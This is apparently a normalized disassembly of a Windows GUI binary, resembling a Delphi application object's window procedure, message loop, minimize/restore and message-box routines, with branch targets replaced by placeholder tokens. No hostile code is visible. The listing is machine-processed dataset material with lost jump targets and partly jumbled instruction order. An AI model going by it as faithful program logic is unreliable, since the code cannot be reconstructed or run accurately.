mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45f870
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_45f16c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_45f826
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45f020
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_460334
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_41a238
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_446be4
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_461260
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_45fe50
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_45fdf4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_446be4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45f870
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_45e624
push ebp
call sub_45f0e4
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_45f0e4
pop ecx
jmp [ eax * 4 + jump_table_45f210 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_446be4
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45fcb4
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_44b55c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45f078
push ebp
call sub_45f0e4
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_45f0e4
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_45f0e4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_41fa38
jmp r-xdata
xor eax eax
call sub_456fa4
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_446be4
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_441578
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45f88c
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_45f0e4
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_45c824
jmp r-xdata
push ebp
call sub_45f0e4
pop ecx
jmp r-xdata
push ebp
call sub_45f120
pop ecx
jmp r-xdata
push ebp
call sub_45f0e4
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45ef84
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45f93c
jmp r-xdata
jmp r-xdata
call sub_430fe0
call sub_4310c0
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45ef74
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45ef84
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45ef7c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_456e54
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_45f0e4
pop ecx
jmp r-xdata
call sub_456f08
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_45f0e4
pop ecx
jmp r-xdata
call sub_430fe0
call sub_43111c
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d4ec
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_45f88c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_45ef74
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_45e8a4
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_446be4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_446be4
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_45f93c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_45e8a4
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_446be4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_45ef84
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_446be4
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_45a5b0
mov eax [ ebx + 0x44 ]
call sub_45c9cc
sub_45fa3c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_45fa78
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_403ff0
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_40408c
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_45fac4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45fb46
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
lea eax [ ebx + 0x8c ]
mov edx esi
call sub_403ff0
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_45fa78
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4043a8
jne r-xdata
mov eax esi
call sub_40445c
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowTextA
lea eax [ ebx + 0x8c ]
call sub_403f9c
jmp r-xdata
cmp [ ebx + 0x8c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fb4d
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_45fb54
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_45fb78
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_45fbc8
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_43d2a4
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_446be4
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_45fc80
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_460bf8
sub_45fcb4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_446be4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_403448
test al al
jne r-xdata
sub_45fd20
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_45fc80
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_45fb78
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_45fbc8
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_45fb54
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_45fdd0
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_45fd20
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_4606a0
sub_45fdf4
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_41a218
mov eax 0x8
call sub_4027b4
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_41a0dc
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_45fe50
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_41a238
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_4027d4
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_41a128
jmp r-xdata
sub_45fee4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push j_sub_4036ec#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_446bc0
mov [ esi + 0x44 ] edi
sub_45ff64
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_460042
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_456dcc
call sub_407f2c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460049
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_45a5b0
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push sub_460009
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45fdd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_4594b8
mov eax [ ebp - 0x4 ]
call sub_45f88c
jmp r-xdata
sub_460064
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_402844
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_402864
push eax
call sub_402844
pop edx
call sub_40b864
call sub_402844
mov edx [ rw-data ]
call sub_4033d8
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_402844
mov edx eax
mov eax ebx
call sub_46025c
pop esi
pop ebx
retn
call sub_402844
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_4600f4
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_456e54
mov [ ebp - 0x10 ] eax
call sub_456d70
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_45eff0
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_460249
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460250
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_456f08
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_456d78
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_46025c
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_460317
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_404034
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_45fa78
mov eax [ ebp - 0x108 ]
call sub_40445c
push eax
mov eax [ ebp - 0x4 ]
call sub_40445c
mov edx eax
mov eax ebx
pop ecx
call sub_4600f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46031e
lea eax [ ebp - 0x108 ]
call sub_403f9c
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
mov eax [ ebp - 0x4 ]
call sub_408754
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402d4c
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402b64
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404264
sub_460334
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_446d80
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_446ee8
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
